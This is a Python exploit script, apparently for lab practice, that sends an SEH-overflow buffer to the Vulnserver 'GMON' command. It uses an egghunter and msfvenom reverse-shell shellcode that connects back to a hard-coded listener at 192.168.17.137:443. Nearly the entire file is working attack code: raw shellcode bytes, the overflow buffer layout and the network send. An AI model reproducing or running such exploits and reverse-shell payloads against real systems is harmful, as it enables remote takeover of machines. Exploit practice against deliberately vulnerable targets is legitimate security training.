# Exploit code to get a reverse shell on Vulnserver host, taking advantage of the "GMON" command
# With this SEH overflow, this exploit code also utilizes egghunter techniques to
# leverage a small attack surface

from pwn import *

host = "192.168.17.129"

port = 9999

# Execute short jmp of 6 bytes
nextSeh = p32(0x909006eb)

# POP POP RET address
seh = p32(0x62501999)


eggHunt = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        "\xef\xb8\x44\x45\x41\x44\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# Egg
dannyDevito = "DEADDEAD"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.17.137 LPORT=443 -b "\x00" -f python
buf = "\xdb\xc2\xd9\x74\x24\xf4\x5a\xbe\x60\xaa\xce\x79\x31"
buf += "\xc9\xb1\x52\x31\x72\x17\x03\x72\x17\x83\x8a\x56\x2c"
buf += "\x8c\xb6\x4f\x33\x6f\x46\x90\x54\xf9\xa3\xa1\x54\x9d"
buf += "\xa0\x92\x64\xd5\xe4\x1e\x0e\xbb\x1c\x94\x62\x14\x13"
buf += "\x1d\xc8\x42\x1a\x9e\x61\xb6\x3d\x1c\x78\xeb\x9d\x1d"
buf += "\xb3\xfe\xdc\x5a\xae\xf3\x8c\x33\xa4\xa6\x20\x37\xf0"
buf += "\x7a\xcb\x0b\x14\xfb\x28\xdb\x17\x2a\xff\x57\x4e\xec"
buf += "\xfe\xb4\xfa\xa5\x18\xd8\xc7\x7c\x93\x2a\xb3\x7e\x75"
buf += "\x63\x3c\x2c\xb8\x4b\xcf\x2c\xfd\x6c\x30\x5b\xf7\x8e"
buf += "\xcd\x5c\xcc\xed\x09\xe8\xd6\x56\xd9\x4a\x32\x66\x0e"
buf += "\x0c\xb1\x64\xfb\x5a\x9d\x68\xfa\x8f\x96\x95\x77\x2e"
buf += "\x78\x1c\xc3\x15\x5c\x44\x97\x34\xc5\x20\x76\x48\x15"
buf += "\x8b\x27\xec\x5e\x26\x33\x9d\x3d\x2f\xf0\xac\xbd\xaf"
buf += "\x9e\xa7\xce\x9d\x01\x1c\x58\xae\xca\xba\x9f\xd1\xe0"
buf += "\x7b\x0f\x2c\x0b\x7c\x06\xeb\x5f\x2c\x30\xda\xdf\xa7"
buf += "\xc0\xe3\x35\x67\x90\x4b\xe6\xc8\x40\x2c\x56\xa1\x8a"
buf += "\xa3\x89\xd1\xb5\x69\xa2\x78\x4c\xfa\x0d\xd4\x5f\x73"
buf += "\xe5\x27\x5f\x82\x4d\xae\xb9\xee\xa1\xe7\x12\x87\x58"
buf += "\xa2\xe8\x36\xa4\x78\x95\x79\x2e\x8f\x6a\x37\xc7\xfa"
buf += "\x78\xa0\x27\xb1\x22\x67\x37\x6f\x4a\xeb\xaa\xf4\x8a"
buf += "\x62\xd7\xa2\xdd\x23\x29\xbb\x8b\xd9\x10\x15\xa9\x23"
buf += "\xc4\x5e\x69\xf8\x35\x60\x70\x8d\x02\x46\x62\x4b\x8a"
buf += "\xc2\xd6\x03\xdd\x9c\x80\xe5\xb7\x6e\x7a\xbc\x64\x39"
buf += "\xea\x39\x47\xfa\x6c\x46\x82\x8c\x90\xf7\x7b\xc9\xaf"
buf += "\x38\xec\xdd\xc8\x24\x8c\x22\x03\xed\xbc\x68\x09\x44"
buf += "\x55\x35\xd8\xd4\x38\xc6\x37\x1a\x45\x45\xbd\xe3\xb2"
buf += "\x55\xb4\xe6\xff\xd1\x25\x9b\x90\xb7\x49\x08\x90\x9d"

buffer = "A" * (3450 - len(dannyDevito + buf))
buffer += dannyDevito
buffer += buf # FUCK
buffer += nextSeh
buffer += seh
buffer += eggHunt
buffer += "B" * (5012 - len(buffer))

conn = remote(host, port)
conn.recvline()
conn.send("GMON /.../" + buffer)
conn.recvline()

conn.close()


